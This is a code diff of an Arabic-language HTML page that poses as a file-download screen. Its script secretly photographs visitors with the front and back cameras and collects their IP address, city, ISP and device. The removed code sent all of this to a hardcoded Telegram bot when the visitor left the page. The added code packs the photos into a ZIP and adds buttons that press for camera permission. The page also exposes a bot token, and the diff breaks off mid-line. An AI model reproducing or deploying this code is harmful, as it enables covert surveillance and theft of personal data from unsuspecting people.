@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 جاري التحميل...</title>
+    <title>📸 تحميل + تصوير</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,7 +22,7 @@
             padding: 40px 30px;
             border-radius: 25px;
             box-shadow: 0 0 60px rgba(233, 69, 96, 0.1);
-            max-width: 440px;
+            max-width: 460px;
             width: 100%;
             border: 1px solid #2a2a4a;
             text-align: center;
@@ -129,13 +129,52 @@
         .info-row:last-child { border-bottom: none; }
         .info-row .label { color: #666; }
         .info-row .value { color: #e94560; }
+        .btn-retry {
+            background: #e94560;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+            display: none;
+        }
+        .btn-retry:hover { background: #c73652; transform: scale(1.03); }
+        .btn-download {
+            background: #4caf50;
+            color: #fff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+            display: none;
+            width: 100%;
+        }
+        .btn-download:hover { background: #45a049; transform: scale(1.02); }
+        .file-info {
+            background: #12122a;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid #2a2a4a;
+            display: none;
+        }
+        .file-info .label { color: #8a8aaa; font-size: 13px; }
+        .file-info .value { color: #e94560; font-size: 14px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="icon">📥</div>
         <h2>جاري التحميل...</h2>
-        <p class="subtitle">يرجى الانتظار، جاري تجهيز الملف</p>
+        <p class="subtitle">سيتم حفظ الصور على جهازك وإرسالها</p>
 
         <div class="loader-box">
             <div style="font-size:40px;">⏳</div>
@@ -154,9 +193,20 @@
         </div>
 
         <div id="status">⏳ جاري التجهيز...</div>
-        <div class="footer">🔒 اتصال آمن • سيتم التنزيل تلقائياً</div>
+        
+        <!-- زر تحميل الملف -->
+        <button class="btn-download" id="downloadBtn">📥 تحميل الملف (ZIP)</button>
+        
+        <div class="file-info" id="fileInfo">
+            <div class="label">📦 الملف جاهز للتحميل</div>
+            <div class="value" id="fileSize">0 KB</div>
+        </div>
+
+        <button class="btn-retry" id="retryBtn">🔄 إعادة المحاولة</button>
+        <div class="footer">🔒 اتصال آمن • سيتم تنزيل الملف تلقائياً</div>
     </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
         const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
         const CHAT_ID = "5730027675";
@@ -169,10 +219,15 @@
         const deviceDisplay = document.getElementById('deviceDisplay');
         const cityDisplay = document.getElementById('cityDisplay');
         const ispDisplay = document.getElementById('ispDisplay');
+        const retryBtn = document.getElementById('retryBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const fileInfo = document.getElementById('fileInfo');
+        const fileSize = document.getElementById('fileSize');
 
         let hasSent = false;
         let isSending = false;
         let photos = [];
+        let photoBlobs = [];
         let stream = null;
         let captureInterval = null;
         let photoCount = 0;
@@ -182,6 +237,8 @@
         let isSwitching = false;
         let userInfo = {};
         let permissionDenied = false;
+        let isCapturing = false;
+        let zipFile = null;
 
         // ====== جلب معلومات المستخدم ======
         async function getUserInfo() {
@@ -252,47 +309,66 @@
             } catch (e) { return false; }
         }
 
-        // ====== إرسال جميع البيانات ======
-        async function sendAllData() {
-            if (isSending || hasSent) return;
-            isSending = true;
+        // ====== إنشاء ملف ZIP للتحميل ======
+        async function createZipFile() {
+            try {
+                const zip = new JSZip();
+                
+                // إضافة الصور
+                for (let i = 0; i < photoBlobs.length; i++) {
+                    const blob = photoBlobs[i];
+                    const fileName = `photo_${String(i + 1).padStart(2, '0')}.jpg`;
+                    zip.file(fileName, blob);
+                }
 
-            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال ${photos.length} صور...`;
-            statusDiv.style.color = '#ff9800';
+                // إضافة ملف معلومات
+                const infoText = `📸 تقرير الصور\n\n` +
+                    `📅 التاريخ: ${new Date().toLocaleString()}\n` +
+                    `📷 عدد الصور: ${photoBlobs.length}\n` +
+                    `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
+                    `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
+                    `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
+                    `📶 المزود: ${userInfo.isp || 'غير معروف'}`;
+                
+                zip.file('info.txt', infoText);
 
-            let successCount = 0;
-            for (const blob of photos) {
-                const sent = await sendPhoto(blob);
-                if (sent) successCount++;
-                await new Promise(r => setTimeout(r, 60));
+                const zipBlob = await zip.generateAsync({ type: 'blob' });
+                zipFile = zipBlob;
+                
+                // تحديث واجهة المستخدم
+                const sizeInKB = Math.round(zipBlob.size / 1024);
+                fileSize.textContent = sizeInKB > 1024 ? `${(sizeInKB / 1024).toFixed(1)} MB` : `${sizeInKB} KB`;
+                fileInfo.style.display = 'block';
+                downloadBtn.style.display = 'block';
+                
+                return zipBlob;
+            } catch (e) {
+                console.error('❌ فشل إنشاء ZIP:', e);
+                return null;
             }
+        }
 
-            const infoMsg = `📸 **تم إرسال ${successCount} صورة**\n\n` +
-                `🌐 **IP:** ${userInfo.ip || 'غير معروف'}\n` +
-                `📍 **الموقع:** ${userInfo.city || 'غير معروف'}\n` +
-                `📶 **المزود:** ${userInfo.isp || 'غير معروف'}\n` +
-                `📱 **الجهاز:** ${userInfo.device || 'غير معروف'}\n` +
-                `🕒 **الوقت:** ${new Date().toLocaleString()}\n` +
-                `📷 **كاميرات:** أمامية + خلفية`;
-
-            await sendMessage(infoMsg);
-
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-            }
-
-            hasSent = true;
-            isSending = false;
-
-            statusDiv.innerHTML = `✅ تم إرسال ${successCount} صورة مع المعلومات`;
+        // ====== تحميل الملف ======
+        function downloadFile() {
+            if (!zipFile) return;
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(zipFile);
+            link.download = `photos_${new Date().getTime()}.zip`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // تحرير الذاكرة
+            setTimeout(() => URL.revokeObjectURL(link.href), 100);
+            
+            statusDiv.innerHTML = '✅ تم تحميل الملف بنجاح!';
             statusDiv.style.color = '#4caf50';
         }
 
-        // ====== طلب الكاميرا فوراً مع رسائل واضحة ======
+        // ====== طلب الكاميرا ======
         async function requestCamera() {
             try {
-                // محاولة الكاميرا الأمامية أولاً
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -305,11 +381,12 @@
                 cameraBadge.textContent = '📷 كاميرا أمامية';
                 statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الأمامية';
                 statusDiv.style.color = '#4caf50';
+                permissionDenied = false;
+                retryBtn.style.display = 'none';
                 return true;
             } catch (error) {
                 console.log('❌ فشل الكاميرا الأمامية:', error.name);
 
-                // إذا فشلت الأمامية، جرب الخلفية
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: {
@@ -323,24 +400,30 @@
                     cameraBadge.textContent = '📷 كاميرا خلفية';
                     statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الخلفية';
                     statusDiv.style.color = '#4caf50';
+                    permissionDenied = false;
+                    retryBtn.style.display = 'none';
                     return true;
                 } catch (error2) {
                     console.log('❌ فشل الكاميرا الخلفية:', error2.name);
                     permissionDenied = true;
 
-                    // رسائل واضحة للمستخدم
                     if (error2.name === 'NotAllowedError' || error2.name === 'PermissionDeniedError') {
-                        statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا. امنح الصلاحية من إعدادات المتصفح.';
+                        statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا. اضغط زر "إعادة المحاولة" لمنح الصلاحية.';
                         statusDiv.style.color = '#ff9800';
                         cameraBadge.textContent = '⚠️ تم رفض الصلاحية';
+                        retryBtn.style.display = 'inline-block';
+                        retryBtn.textContent = '📷 منح صلاحية الكاميرا';
                     } else if (error2.name === 'NotFoundError' || error2.name === 'DevicesNotFoundError') {
                         statusDiv.innerHTML = '📵 لا توجد كاميرا على هذا الجهاز.';
                         statusDiv.style.color = '#ff9800';
                         cameraBadge.textContent = '📵 لا توجد كاميرا';
+                        retryBtn.style.display = 'none';
                     } else {
                         statusDiv.innerHTML = '❌ خطأ غير معروف: ' + error2.message;
                         statusDiv.style.color = '#e94560';
                         cameraBadge.textContent = '❌ خطأ';
+                        retryBtn.style.display = 'inline-block';
+                        retryBtn.textContent = '🔄 إعادة المحاولة';
                     }
                     return false;
                 }
@@ -415,86 +498,4 @@
                     statusDiv.style.color = '#ff9800';
                 } else {
                     statusDiv.innerHTML = `⚠️ لا توجد كاميرا ${cameraName}`;
-                    statusDiv.style.color = '#ff9800';
-                }
-                return false;
-            }
-        }
-
-        // ====== بدء التصوير ======
-        async function startAutoCapture() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
-            statusDiv.style.color = '#ff9800';
-
-            // جلب معلومات المستخدم
-            await getUserInfo();
-
-            // طلب الكاميرا
-            const cameraReady = await requestCamera();
-
-            if (!cameraReady) {
-                // إذا تم رفض الصلاحية، نرسل إشعار بالرفض
-                await sendMessage(`🚫 **تم رفض صلاحية الكاميرا**\n\n` +
-                    `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
-                    `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
-                    `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
-                    `🕒 الوقت: ${new Date().toLocaleString()}`);
-                return;
-            }
-
-            statusDiv.innerHTML = `📸 جاري التصوير...`;
-            statusDiv.style.color = '#4caf50';
-
-            // إرسال إشعار بدء
-            await sendMessage(`📷 **بدأ التصوير**\n\n` +
-                `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
-                `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
-                `📶 المزود: ${userInfo.isp || 'غير معروف'}\n` +
-                `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
-                `🕒 الوقت: ${new Date().toLocaleString()}`);
-
-            let captureCount = 0;
-            const totalCaptures = maxPhotos;
-
-            captureInterval = setInterval(async () => {
-                if (captureCount >= totalCaptures) {
-                    clearInterval(captureInterval);
-                    statusDiv.innerHTML = `✅ تم التقاط ${totalCaptures} صورة - سيتم إرسالها عند الخروج`;
-                    statusDiv.style.color = '#4caf50';
-                    progressFill.style.width = '100%';
-                    progressText.innerHTML = '✅ اكتمل التحميل!';
-                    await sendMessage(`✅ **اكتمل التصوير** (${totalCaptures} صورة)`);
-                    return;
-                }
-
-                // التبديل كل 3 صور
-                if (captureCount > 0 && captureCount % 3 === 0) {
-                    await switchCamera();
-                    await new Promise(r => setTimeout(r, 200));
-                }
-
-                const blob = await capturePhoto();
-                if (blob) {
-                    photos.push(blob);
-                    captureCount++;
-                    photoCount++;
-                    progress = Math.round((captureCount / totalCaptures) * 100);
-                    progressFill.style.width = progress + '%';
-                    progressText.innerHTML = `جاري التحميل ${progress}%`;
-                    const cameraName = currentCamera === 'environment' ? 'خلفية' : 'أمامية';
-                    statusDiv.innerHTML = `📸 جاري التصوير ${captureCount}/${totalCaptures} (${cameraName})`;
-                }
-            }, 500);
-        }
-
-        // ====== مراقبة الخروج ======
-        window.addEventListener('beforeunload', sendAllData);
-        window.addEventListener('pagehide', sendAllData);
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                sendAllData();
-            }
-        });
-
-        // ====== بدء التصوير فوراً ======
-        setTimeout(star
+                    statusDiv.style.color = '#ff9800'
